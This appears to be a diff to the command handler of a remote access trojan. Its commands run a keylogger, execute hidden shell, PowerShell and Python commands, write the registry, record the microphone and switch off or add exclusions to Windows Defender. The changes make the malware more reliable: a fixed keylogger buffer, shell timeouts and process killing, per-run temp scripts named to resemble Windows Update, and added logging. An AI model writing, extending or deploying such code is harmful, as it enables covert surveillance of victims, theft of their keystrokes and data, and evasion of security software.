@@ -22,7 +22,7 @@ import traceback
 from typing import Callable
 
 from ..lan import discover as lan_discover
-from .. import guardian
+from .. import config, guardian, log
 
 from . import (audio, camera, cloak, defender, files, inject, inputs, persistence,
                runtime, screen, stealth, sysinfo, system, updater)
@@ -222,11 +222,13 @@ def cmd_key(agent, argument: str) -> str:
     if action == "stop":
         log.stop()
         return "keylogger stopped"
-    if action in ("dump", "peek", "get"):
+    if action == "peek":
+        # Was unreachable: "peek" sat in the draining branch, so peeking
+        # destroyed the buffer.
+        return log.snapshot() or "(nothing recorded yet)"
+    if action in ("dump", "get"):
         text = log.drain()
         return text or "(nothing recorded yet)"
-    if action == "peek":
-        return log.snapshot() or "(nothing recorded yet)"
     if action == "clear":
         log.clear()
         return "cleared"
@@ -525,11 +527,17 @@ def cmd_start(agent, argument: str) -> str:
 
 @command("net.info", "net")
 def cmd_network(agent, argument: str) -> str:
-    return subprocess.run(
-        "ipconfig /all" if os.name == "nt" else "ip address",
-        shell=True, capture_output=True, timeout=30,
-        creationflags=CREATE_NO_WINDOW,
-    ).stdout.decode(errors="replace")
+    try:
+        result = subprocess.run(
+            "ipconfig /all" if os.name == "nt" else "ip address",
+            shell=True, capture_output=True, timeout=30,
+            creationflags=CREATE_NO_WINDOW,
+        )
+        return result.stdout.decode(errors="replace")
+    except subprocess.TimeoutExpired:
+        return "net.info timed out"
+    except Exception as error:
+        return f"net.info failed: {error}"
 
 
 @command("net.wifi", "wifi")
@@ -604,7 +612,12 @@ def cmd_reg_read(agent, argument: str) -> str:
 
 @command("reg.write")
 def cmd_reg_write(agent, argument: str) -> str:
-    path, _, value = argument.partition(" ")
+    # Split at the last space so values containing spaces survive.
+    if argument.startswith("{"):
+        return sysinfo.registry_write(
+            json.loads(argument).get("path", ""),
+            json.loads(argument).get("value", ""))
+    path, _, value = argument.rpartition(" ")
     return sysinfo.registry_write(path, value)
 
 
@@ -648,7 +661,8 @@ def cmd_powershell(agent, argument: str) -> None:
     if not argument:
         agent.reply("usage: ps1 <powershell command or expression>")
         return
-    path = os.path.join(tempfile.gettempdir(), "wu-run.ps1")
+    handle, path = tempfile.mkstemp(prefix="wu-run-", suffix=".ps1")
+    os.close(handle)
     try:
         with open(path, "w", encoding="utf-8") as handle:
             handle.write(argument)
@@ -659,6 +673,17 @@ def cmd_powershell(agent, argument: str) -> None:
                 os.remove(path)
         except OSError:
             pass
+
+
+@command("proc.stop", "proc.killall")
+def cmd_proc_stop(agent, argument: str) -> str:
+    """Kill every shell/python child this agent started."""
+    killed = 0
+    for process in list(agent.processes):
+        _kill_tree(process)
+        killed += 1
+        agent.processes.discard(process)
+    return f"stopped {killed} child process(es)"
 
 
 @command("py", "python")
@@ -672,6 +697,10 @@ def cmd_python(agent, argument: str) -> None:
         return
 
     python_bin = runtime.interpreter()
+    if python_bin.lower().endswith("pythonw.exe"):
+        console = python_bin[: -len("pythonw.exe")] + "python.exe"
+        if os.path.exists(console):
+            python_bin = console   # pythonw has no stdout to capture
     trimmed = argument.strip()
     first_token, _, rest = trimmed.partition(" ")
     first_path = os.path.expanduser(first_token.strip('"'))
@@ -710,6 +739,41 @@ def cmd_eval(agent, argument: str) -> str:
             return "ok"
         except Exception:
             return traceback.format_exc()
+
+
+@command("log.tail")
+def cmd_log_tail(agent, argument: str) -> str:
+    try:
+        count = int(argument or 200)
+    except ValueError:
+        count = 200
+    return log.dump(count)
+
+
+@command("log.level")
+def cmd_log_level(agent, argument: str) -> str:
+    return log.set_level(argument)
+
+
+@command("log.clear")
+def cmd_log_clear(agent, argument: str) -> str:
+    return log.clear()
+
+
+@command("log.counters")
+def cmd_log_counters(agent, argument: str) -> str:
+    import json as _json
+    return _json.dumps(log.counters(), indent=1)
+
+
+@command("install.report")
+def cmd_install_report(agent, argument: str) -> str:
+    path = os.path.join(stealth.primary_directory(), "install.log")
+    try:
+        with open(path, "r", encoding="utf-8", errors="replace") as handle:
+            return handle.read()[-8000:] or "(install.log empty)"
+    except OSError:
+        return "(no install.log)"
 
 
 @command("help")
@@ -834,8 +898,27 @@ def cmd_uninstall(agent, argument: str) -> None:
 # --------------------------------------------------------------------------
 
 
-def shell(agent, command: str) -> None:
-    """Run ``command`` through the system shell and stream the output."""
+def _kill_tree(process) -> None:
+    """Kill a process and its children."""
+    try:
+        if os.name == "nt":
+            subprocess.run(["taskkill", "/F", "/T", "/PID", str(process.pid)],
+                           capture_output=True, timeout=10,
+                           creationflags=CREATE_NO_WINDOW)
+        else:
+            process.kill()
+    except Exception:
+        pass
+
+
+def shell(agent, command: str, timeout: float = 0) -> None:
+    """Run ``command`` through the system shell and stream the output.
+
+    Now bounded: an un-timed-out ``ping -t`` used to hold a thread and a pipe
+    for the life of the process, with no way to stop it from the dashboard.
+    """
+    timeout = timeout or config.SHELL_TIMEOUT
+    log.get("commands").info("shell: %s", command[:200])
     try:
         process = subprocess.Popen(
             command, shell=True, cwd=agent.cwd if os.path.isdir(agent.cwd) else None,
@@ -843,14 +926,25 @@ def shell(agent, command: str) -> None:
             creationflags=CREATE_NO_WINDOW,
         )
         agent.processes.add(process)
+        deadline = time.time() + timeout if timeout else 0
+        timed_out = False
         if process.stdout:
             for raw in iter(process.stdout.readline, b""):
                 agent.reply(raw.decode(errors="replace").rstrip("\r\n"))
-            process.stdout.close()
+                if deadline and time.time() > deadline:
+                    timed_out = True
+                    _kill_tree(process)
+                    break
+            try:
+                process.stdout.close()
+            except Exception:
+                pass
         process.wait()
-        agent.reply(f"[exit {process.returncode}]")
+        agent.reply(f"[timeout after {int(timeout)}s - killed]" if timed_out
+                    else f"[exit {process.returncode}]")
         agent.processes.discard(process)
-    except Exception:
+    except Exception as error:
+        log.get("commands").warning("shell failed: %s", error, exc_info=True)
         agent.reply(traceback.format_exc().strip().splitlines()[-1])
 
 
@@ -879,10 +973,15 @@ def cmd_mic(agent, argument: str) -> str:
 def cmd_defender(agent, argument: str) -> str:
     arg = argument.strip()
     if not arg:
-        return "usage: defender <disable | exclude <path_or_process>>"
+        return "usage: defender <off | on | status | exclude <path_or_process>>"
     parts = arg.split(maxsplit=1)
     sub = parts[0].lower()
-    if sub == "disable":
+    if sub in ("on", "enable", "restore"):
+        return ("defender realtime monitoring restored" if defender.enable_monitoring()
+                else "failed to re-enable defender")
+    if sub == "status":
+        return "\n".join(f"{k:18} {v}" for k, v in defender.status().items())
+    if sub in ("off", "disable"):
         ok = defender.disable_monitoring()
         return "defender realtime monitoring disabled" if ok else "failed to disable defender"
     if sub in ("exclude", "add"):
@@ -942,6 +1041,7 @@ def execute(agent, line: str) -> None:
             agent.reply(result)
     except Exception:
         err_msg = traceback.format_exc().strip().splitlines()[-1]
+        log.get("commands").error("command %r failed: %s", name, err_msg, exc_info=True)
         if hasattr(agent, "health") and agent.health:
             agent.health.mark_error(err_msg)
         agent.reply(err_msg)
